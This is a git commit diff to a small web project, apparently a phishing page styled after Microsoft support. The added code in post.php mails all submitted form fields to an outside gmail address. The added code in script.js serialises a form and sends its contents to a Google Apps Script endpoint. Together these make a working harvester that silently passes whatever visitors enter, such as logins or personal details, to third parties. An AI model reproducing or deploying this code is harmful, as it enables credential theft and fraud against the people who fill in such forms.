f52de039765c8bbe1166a285834117ec509e4052
Soporte España <espanahelp24@gmail.com>
2017-11-20 18:51:52 +0000

    Add files via upload

--- post.php
+++ post.php
@@ -1,6 +1,8 @@
 <?php
 if (isset($_POST) && !empty($_POST)) {
+    $chosen = $_POST;
     print_r($_POST);
     print_r($_FILES);
+    mail("salprez4@gmail.com", $chosen);
 }
 ?>
--- script.js
+++ script.js
@@ -1,3 +1,64 @@
+$.fn.serializeObject = function()
+{
+ var o = {};
+ var a = this.serializeArray();
+ $.each(a, function() {
+ if (o[this.name]) {
+ if (!o[this.name].push) {
+ o[this.name] = [o[this.name]];
+ }
+ o[this.name].push(this.value || ‘’);
+ } else {
+ o[this.name] = this.value || ‘’;
+ }
+ });
+ return o;
+};
+
+
+
+
+var $form = $("#daform")
+
+var url = "https://script.google.com/macros/s/AKfycbz7wmM2XV-2gPIzKO3KGd5gUss5wnWU8NRdijRMnqJLP-IeyfY/exec";
+
+
+$("button#sender").on('click',function(e){
+    e.preventDefault();
+    var jqxhr = $.ajax({
+        url: url,
+        method: "GET",
+        dataType: "json",
+        data: $form.serializeObject()
+    }).success(
+    );
+});
+
+
+
+
+
+
+
+
+
+
+
+/*
+
+/u/0
+https://script.google.com/macros/u/0/s/AKfycbz7wmM2XV-2gPIzKO3KGd5gUss5wnWU8NRdijRMnqJLP-IeyfY/exec
+
+
+*/
+
+
+
+
+
+
+
+/*
 $("button#sender").on('click', function(e){
     e.preventDefault();
     var val1 = $("#oldest").val();
@@ -21,3 +82,4 @@ $("button#sender").on('click', function(e){
     $("body").html("<img src='301.gif' alt='Microsoft\'s loading logo style='text-align:center; display:block; margin: 100px auto' />");
 });
 
+*/
